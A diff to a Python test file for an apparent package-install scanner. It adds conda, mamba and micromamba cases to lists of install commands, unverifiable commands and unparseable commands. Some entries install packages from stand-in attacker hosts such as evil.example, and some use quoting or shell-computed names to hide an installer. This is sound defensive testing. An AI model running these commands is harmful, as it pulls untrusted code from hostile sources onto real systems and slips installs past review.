@@ -48,6 +48,10 @@ INSTALL_COMMANDS = [
     ("hatch run test:pip install requests", ["pypi:requests"]),
     ("hatch env run -e test -- pip install requests", ["pypi:requests"]),
     ("tox exec -e py -- pip install requests", ["pypi:requests"]),
+    # `conda run` installs nothing itself; the command it runs in the environment is read.
+    ("conda run -n e pip install requests", ["pypi:requests"]),
+    ("conda run --no-capture-output -p ./env npx -y cowsay", ["npm:cowsay"]),
+    ("micromamba run -n e uv add pydantic", ["pypi:pydantic"]),
     # npx fetches `tsc` from the registry when it is not installed locally (a squatted name).
     ("npx tsc --noEmit", ["npm:tsc"]),
 ]
@@ -689,6 +693,12 @@ UNVERIFIABLE_COMMANDS = [
     "uv add --index https://pypi.evil.example/simple pkg",
     "npm install https://evil.example/pkg-1.0.0.tgz",
     "pip install https://evil.example/pkg-1.0.tar.gz",
+    # conda packages come from conda channels, which the scanner does not read.
+    "conda install numpy",
+    "conda create -n e numpy",
+    "mamba install -c conda-forge numpy",
+    "micromamba install conda-forge::numpy",
+    "conda install -c https://conda.evil.example/channel pkg",
 ]
 
 
@@ -1026,6 +1036,8 @@ def test_a_package_name_the_shell_computes_asks_the_person(command):
         ("bash", "npm i $(npm i evil-pkg"),
         ("powershell", "npm i 'evil-pkg"),
         ("bash", "pip-sync 'requirements.txt"),
+        ("bash", "conda install 'numpy"),
+        ("bash", "C=conda; $C install numpy"),
     ],
 )
 def test_a_command_the_parser_cannot_read_asks_when_it_names_an_installer(shell, command):
